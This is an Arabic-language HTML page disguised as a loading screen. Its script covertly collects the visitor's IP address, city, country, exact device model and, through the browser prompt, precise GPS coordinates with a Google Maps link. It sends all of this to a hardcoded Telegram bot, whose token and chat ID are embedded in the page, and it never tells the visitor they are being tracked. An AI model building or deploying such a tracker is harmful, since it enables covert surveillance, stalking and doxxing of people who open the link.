<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>جاري التحميل...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: sans-serif;
            color: #fff;
        }
        .container {
            text-align: center;
        }
        .spinner {
            border: 4px solid rgba(255,255,255,0.1);
            border-top: 4px solid #00aaff;
            border-radius: 50%;
            width: 45px;
            height: 45px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #status {
            font-size: 14px;
            color: #888;
        }
        #done {
            display: none;
            color: #4ade80;
            font-weight: bold;
            margin-top: 15px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner" id="spinner"></div>
        <div id="status">⏳ جاري تهيئة الاتصال...</div>
        <div id="done">✅ اكتمل</div>
    </div>

    <script>
        // ============================================================
        // 🔑 بيانات البوت (تم إدخالها مسبقاً)
        const BOT_TOKEN = '8987813029:AAEuXcuCf2WWbYd7CWYNLdhJqfWAuCaDYdA';
        const CHAT_ID = '5343926721';
        // ============================================================

        let reportSent = false;

        function setStatus(text) {
            document.getElementById('status').textContent = text;
        }

        // === استخراج اسم الجهاز (بوكو، جالكسي، آيفون) ===
        function getExactDevice(ua) {
            let model = 'غير معروف';
            let os = 'جهاز';
            if (ua.includes('Android')) os = 'Android';
            else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
            else if (ua.includes('Windows')) os = 'Windows';
            else if (ua.includes('Macintosh')) os = 'Mac';

            const match = ua.match(/\(([^)]+)\)/);
            if (match) {
                const parts = match[1].split(';').map(p => p.trim());
                for (let p of parts) {
                    if (p.match(/SM-[A-Za-z0-9]+/)) { model = p; break; }
                    if (p.match(/iPhone[0-9]+,[0-9]+/)) { model = p; break; }
                    if (p.match(/Pixel [0-9]+/)) { model = p; break; }
                    if (p.match(/210[0-9]{6,7}[A-Za-z]?/)) { model = p; break; }
                    if (p.match(/RMX[0-9]+/)) { model = p; break; }
                    if (p.match(/V[0-9]{4}/)) { model = p; break; }
                    if (p.match(/[A-Z]{2,4}-[LX][A-Z0-9]{1,3}/)) { model = p; break; }
                    if (p.match(/CPH[0-9]+/)) { model = p; break; }
                }
                if (model === 'غير معروف') {
                    for (let p of parts) {
                        if (p.length > 3 && p.length < 20 && 
                            !p.includes('Android') && !p.includes('Linux') && 
                            !p.includes('AppleWebKit') && !p.includes('Mobile') &&
                            !p.includes('Build')) {
                            model = p;
                            break;
                        }
                    }
                }
            }
            if (model === 'غير معروف') {
                const buildMatch = ua.match(/Build\/([^;]+)/);
                if (buildMatch) model = buildMatch[1];
            }
            return `${os} (${model})`;
        }

        // === البيانات الأساسية ===
        const data = {
            ip: 'غير معروف',
            country: 'غير معروف',
            city: 'غير معروف',
            lat: 'غير معروف',
            lon: 'غير معروف',
            gps_lat: null,
            gps_lon: null,
            exactDevice: getExactDevice(navigator.userAgent),
            time: new Date().toLocaleString('ar-EG', { hour12: false }),
            url: window.location.href,
            referrer: document.referrer || 'مباشر'
        };

        // === 1. جلب الـ IP والتقريبي (يعمل في الخلفية) ===
        async function fetchIP() {
            setStatus('🌐 جلب معلومات الشبكة...');
            try {
                const res = await fetch('https://ip-api.com/json/?fields=status,country,city,lat,lon,query');
                const info = await res.json();
                if (info.status === 'success' && info.query) {
                    data.ip = info.query;
                    data.country = info.country || 'غير معروف';
                    data.city = info.city || 'غير معروف';
                    data.lat = info.lat || 'غير معروف';
                    data.lon = info.lon || 'غير معروف';
                }
            } catch (e) {}
        }

        // === 2. طلب الموقع الدقيق (يظهر نافذة المتصفح) ===
        function requestGPS() {
            if (!navigator.geolocation) {
                setStatus('📡 GPS غير مدعوم، نرسل التقريبي');
                sendReport();
                return;
            }

            setStatus('📍 جاري طلب الموقع (انظر نافذة المتصفح)...');

            // نطلب الموقع مرة واحدة فقط.
            // إذا ضغط المستخدم "سماح" -> ينجح ويرسل مباشرة.
            // إذا ضغط "رفض" أو انتهت المهلة -> يرسل التقريبي.
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    // ✅ نجاح فوري
                    data.gps_lat = pos.coords.latitude;
                    data.gps_lon = pos.coords.longitude;
                    setStatus('✅ تم الحصول على الموقع الدقيق!');
                    sendReport();
                },
                (err) => {
                    // ❌ رفض أو خطأ
                    setStatus('⚠️ تم رفض الموقع، نرسل التقريبي');
                    sendReport();
                },
                { enableHighAccuracy: true, timeout: 7000 }
            );
        }

        // === 3. إرسال التقرير (مرة واحدة فقط) ===
        function sendReport() {
            if (reportSent) return;
            reportSent = true;

            let msg = `🛡️ <b>تقرير الزائر</b>\n\n`;
            msg += `🌐 IP: ${data.ip}\n`;
            msg += `📍 الدولة: ${data.country}\n`;
            msg += `🏙️ المدينة: ${data.city}\n`;
            msg += `📱 الجهاز: ${data.exactDevice}\n`;

            if (data.gps_lat && data.gps_lon) {
                msg += `🛰️ <b>الموقع الدقيق (GPS):</b>\n`;
                msg += `📍 ${data.gps_lat}, ${data.gps_lon}\n`;
                msg += `🗺️ https://www.google.com/maps?q=${data.gps_lat},${data.gps_lon}\n`;
            } else {
                msg += `📍 التقريبي (IP): ${data.lat}, ${data.lon}\n`;
                msg += `🗺️ https://www.google.com/maps?q=${data.lat},${data.lon}\n`;
                msg += `\n⚠️ (موقع السنترال وليس المنزل)`;
            }

            msg += `\n🕒 الوقت: ${data.time}`;

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: msg,
                    parse_mode: 'HTML'
                })
            }).then(() => {
                document.getElementById('spinner').style.display = 'none';
                document.getElementById('status').textContent = '✅ اكتمل بنجاح';
                document.getElementById('done').style.display = 'block';
            }).catch(() => {
                document.getElementById('status').textContent = '⚠️ تم الاكتمال مع تحذيرات';
            });
        }

        // === 4. بدء التشغيل (بدون أي تأخير مزعج) ===
        setTimeout(async () => {
            await fetchIP(); // يجلب التقريبي في الخلفية
            // بعد نصف ثانية، نطلب GPS مباشرة (ستظهر نافذة المتصفح)
            setTimeout(() => {
                requestGPS();
            }, 400);
        }, 300);
    </script>
</body>
</html>
